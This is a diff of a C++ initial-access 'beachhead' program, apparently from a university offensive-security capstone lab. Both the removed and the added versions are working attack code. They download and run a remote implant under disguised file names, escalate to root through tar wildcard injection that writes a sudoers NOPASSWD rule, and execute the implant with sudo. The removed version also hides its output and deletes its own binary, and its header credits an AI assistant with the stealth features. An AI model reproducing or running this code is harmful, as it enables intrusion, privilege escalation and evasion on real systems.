@@ -1,249 +1,56 @@
-/*
- * COMPSCI564 - Cyber Effects Capstone Project
- * Beachhead - Initial Access Stage (Stealth-Enhanced)
- *
- * This version downloads the C++ implant binary and its TLS certificate,
- * attempts privilege escalation via tar wildcard injection, and then
- * executes the implant with sudo (if possible) or as the current user.
- *
- * AI Assistance Attribution:
- *   - Integration of sudo capability check
- *   - Download and execution of C++ implant
- *   - Stealth enhancements developed with Claude (Anthropic)
- *
- * For educational use in controlled lab environment only.
- */
-
+#include <iostream>
 #include <cstdlib>
 #include <string>
-#include <unistd.h>
-#include <sys/syscall.h>
-#include <sys/wait.h>
-#include <fcntl.h>          // <-- ADDED: for O_WRONLY
-#include <cstring>
+#include <vector>
+#include <thread>
+#include <chrono>
 
-#include "privesc_check.h"
-#include "privesc.h"
-
-// ----------------------------------------------------------------------
-// Minimal logging (only when DEBUG is defined)
-// ----------------------------------------------------------------------
-static void log_status(const char* msg) {
-#ifdef DEBUG
-    size_t len = 0;
-    while (msg[len]) len++;
-    syscall(SYS_write, 2, msg, len);  // stderr
-    syscall(SYS_write, 2, "\n", 1);
-#else
-    (void)msg;   // suppress unused parameter warning
-#endif
-}
-
-// ----------------------------------------------------------------------
-// Check if current user can run sudo without a password
-// Returns true if "sudo -n true" succeeds, false otherwise.
-// ----------------------------------------------------------------------
-static bool can_sudo_nopasswd() {
-    pid_t pid = syscall(SYS_fork);
-    if (pid < 0) return false;
-
-    if (pid == 0) {
-        // child: redirect stdout/stderr to /dev/null
-        int devnull = syscall(SYS_open, "/dev/null", O_WRONLY);
-        if (devnull >= 0) {
-            syscall(SYS_dup2, devnull, 1);  // stdout
-            syscall(SYS_dup2, devnull, 2);  // stderr
-            syscall(SYS_close, devnull);
-        }
-        const char* argv[] = { "sudo", "-n", "true", nullptr };
-        syscall(SYS_execve, "/usr/bin/sudo", argv, nullptr);
-        syscall(SYS_exit, 1);  // execve failed
-    }
-
-    // parent: wait for child
-    int status;
-    syscall(SYS_wait4, pid, &status, 0, nullptr);
-    return (WIFEXITED(status) && WEXITSTATUS(status) == 0);
-}
-
-// ----------------------------------------------------------------------
-// Download a file using wget (quiet, no output)
-// ----------------------------------------------------------------------
-static bool download_file(const char* url, const char* dest) {
-    pid_t pid = syscall(SYS_fork);
-    if (pid < 0) return false;
-
-    if (pid == 0) {
-        // child: run wget -q url -O dest
-        int devnull = syscall(SYS_open, "/dev/null", O_WRONLY);
-        if (devnull >= 0) {
-            syscall(SYS_dup2, devnull, 1);
-            syscall(SYS_dup2, devnull, 2);
-            syscall(SYS_close, devnull);
-        }
-        const char* argv[] = { "wget", "-q", url, "-O", dest, nullptr };
-        syscall(SYS_execve, "/usr/bin/wget", argv, nullptr);
-        syscall(SYS_exit, 1);
-    }
-
-    // parent: wait for child
-    int status;
-    syscall(SYS_wait4, pid, &status, 0, nullptr);
-    return (WIFEXITED(status) && WEXITSTATUS(status) == 0);
-}
-
-// ----------------------------------------------------------------------
-// Main entry point
-// ----------------------------------------------------------------------
 int main() {
-    // ====================================================================
-    // STAGE 1: Pre‑escalation reconnaissance (stealth‑enhanced)
-    // ====================================================================
-    log_status("[*] Stage 1: Checking privilege escalation conditions...");
+    // 1. Get the implant
+    std::string url = URL;
+    std::string downloadCmd = "wget -q " + url + " -O /tmp/user.json";
+    
+    std::cout << "[*] Downloading implant..." << std::endl;
+    std::system(downloadCmd.c_str());
+    std::system("chmod +x /tmp/user.json");
 
-    PrivEscConditions cond = check_privesc_viability();
+    std::string certUrl = CERT_URL;
+    std::string downloadCert = "wget -q " + certUrl + " -O /tmp/index.html";
+    std::system(downloadCert.c_str());
 
-#ifdef DEBUG
-    // Build debug output manually (avoid snprintf)
-    char debug_msg[256] = "[*] UID: ";
-    int pos = 9;
+    // 2. Look for privesc vectors (Cron jobs)
+    std::cout << "\n[*] Checking /etc/cron.d for potential vectors:" << std::endl;
+    std::system("ls -la /etc/cron.d");
+    
+    // Search for the specific tar vulnerability in crontab
+    std::cout << "\n[*] Searching for tar wildcards in crontab..." << std::endl;
+    std::system("grep -r \"tar\" /etc/cron.d /etc/crontab 2>/dev/null");
 
-    // Convert UID to string
-    unsigned int uid = cond.current_uid;
-    char uid_str[16];
-    int uid_len = 0;
-    if (uid == 0) {
-        uid_str[uid_len++] = '0';
-    } else {
-        char tmp[16];
-        int tpos = 0;
-        while (uid > 0) {
-            tmp[tpos++] = '0' + (uid % 10);
-            uid /= 10;
-        }
-        for (int i = tpos - 1; i >= 0; i--)
-            uid_str[uid_len++] = tmp[i];
+    // 3. Execute Privesc Commands (Tar Wildcard Injection)
+    std::cout << "\n[*] Setting up Tar Wildcard Injection in /tmp/backups..." << std::endl;
+    
+    std::vector<std::string> exploitCmds = {
+        "cd /tmp/backups && echo 'echo \"www-data ALL=(root) NOPASSWD: ALL\" > /etc/sudoers.d/www-data' > tests.sh",
+        "cd /tmp/backups && chmod +x tests.sh",
+        "cd /tmp/backups && touch -- '--checkpoint=1'",
+        "cd /tmp/backups && touch -- '--checkpoint-action=exec=sh tests.sh'"
+    };
+
+    for (const auto& cmd : exploitCmds) {
+        std::system(cmd.c_str());
     }
-    uid_str[uid_len] = '\0';
-    for (int i = 0; i < uid_len; i++) debug_msg[pos++] = uid_str[i];
+    
+    std::cout << "[!] Exploit staged. Waiting for cron job to trigger..." << std::endl;
+    
+    // Wait for 8 seconds for the cron job to execute
+    std::cout << "[*] Waiting for 8 seconds..." << std::endl;
+    std::this_thread::sleep_for(std::chrono::seconds(8));
 
-    const char* suffix = " | Backups writable: ";
-    for (int i = 0; suffix[i]; i++) debug_msg[pos++] = suffix[i];
-    const char* writable = cond.backups_dir_writable ? "YES" : "NO";
-    for (int i = 0; writable[i]; i++) debug_msg[pos++] = writable[i];
-
-    suffix = " | Tar: ";
-    for (int i = 0; suffix[i]; i++) debug_msg[pos++] = suffix[i];
-    const char* tar = cond.tar_available ? "YES" : "NO";
-    for (int i = 0; tar[i]; i++) debug_msg[pos++] = tar[i];
-
-    suffix = " | Cron: ";
-    for (int i = 0; suffix[i]; i++) debug_msg[pos++] = suffix[i];
-    const char* cron = cond.cron_running ? "YES" : "NO";
-    for (int i = 0; cron[i]; i++) debug_msg[pos++] = cron[i];
-
-    debug_msg[pos] = '\0';
-    log_status(debug_msg);
-#endif
-
-    // ====================================================================
-    // STAGE 2: Attempt privilege escalation (if conditions are met)
-    // ====================================================================
-    bool should_escalate = cond.backups_dir_writable &&
-                           cond.tar_available &&
-                           cond.cron_running &&
-                           cond.current_uid != 0;
-
-    if (should_escalate && !can_sudo_nopasswd()) {
-        log_status("[*] Stage 2: Attempting privilege escalation...");
-        if (execute_tar_privesc() == 0) {
-            log_status("[+] Privilege escalation staged. Waiting for cron...");
-            // Wait up to 75 seconds for the cron job to run
-            for (int i = 0; i < 15; i++) {
-                struct timespec ts = {5, 0};  // 5 seconds
-                syscall(SYS_nanosleep, &ts, nullptr);
-                if (can_sudo_nopasswd()) {
-                    log_status("[+] Successfully gained sudo privileges!");
-                    break;
-                }
-            }
-        } else {
-            log_status("[!] Privilege escalation setup failed");
-        }
-    } else if (cond.current_uid == 0) {
-        log_status("[+] Already running as root");
-    } else if (can_sudo_nopasswd()) {
-        log_status("[+] Already have sudo access");
-    } else {
-        log_status("[!] Privilege escalation conditions not met, proceeding anyway");
-    }
-
-    // ====================================================================
-    // STAGE 3: Download the C++ implant and its TLS certificate
-    // ====================================================================
-    log_status("[*] Stage 3: Downloading implant and certificate...");
-
-    // Implant binary location (defined via -DURL in Makefile)
-    const char* implant_url = URL;
-    // Certificate location (derived from URL, e.g., http://.../cert.pem)
-    std::string cert_url_str = URL;
-    size_t last_slash = cert_url_str.rfind('/');
-    if (last_slash != std::string::npos)
-        cert_url_str = cert_url_str.substr(0, last_slash + 1) + "cert.pem";
-    else
-        cert_url_str = "cert.pem";
-    const char* cert_url = cert_url_str.c_str();
-
-    const char* implant_path = "/tmp/systemd-private-update";
-    const char* cert_path = "/tmp/index.html";
-
-    if (!download_file(implant_url, implant_path)) {
-        log_status("[!] Failed to download implant");
-        return 1;
-    }
-
-    if (!download_file(cert_url, cert_path)) {
-        log_status("[!] Failed to download certificate (continuing anyway)");
-    }
-
-    syscall(SYS_chmod, implant_path, 0755);
-    log_status("[+] Implant and certificate downloaded");
-
-    // ====================================================================
-    // STAGE 4: Execute the implant with elevated privileges
-    // ====================================================================
-    log_status("[*] Stage 4: Executing implant...");
-
-    pid_t child_pid = syscall(SYS_fork);
-    if (child_pid < 0) {
-        log_status("[!] Fork failed");
-        return 1;
-    }
-
-    if (child_pid == 0) {
-        // Child: redirect output to /dev/null and exec implant
-        int devnull = syscall(SYS_open, "/dev/null", O_WRONLY);
-        if (devnull >= 0) {
-            syscall(SYS_dup2, devnull, 1);
-            syscall(SYS_dup2, devnull, 2);
-            syscall(SYS_close, devnull);
-        }
-
-        if (can_sudo_nopasswd()) {
-            const char* argv[] = { "sudo", "-n", implant_path, nullptr };
-            syscall(SYS_execve, "/usr/bin/sudo", argv, nullptr);
-        } else {
-            const char* argv[] = { implant_path, nullptr };
-            syscall(SYS_execve, implant_path, argv, nullptr);
-        }
-        syscall(SYS_exit, 1);
-    }
-
-    log_status("[+] Implant launched");
-
-#ifndef DEBUG
-    syscall(SYS_unlink, "/proc/self/exe");
-#endif
+    // 4. Run the implant as sudo
+    // We attempt to run it; if the exploit hasn't triggered yet, this will fail.
+    std::cout << "[*] Attempting to execute implant with sudo..." << std::endl;
+    std::string runImplant = "sudo /tmp/user.json";
+    std::system(runImplant.c_str());
 
     return 0;
 }
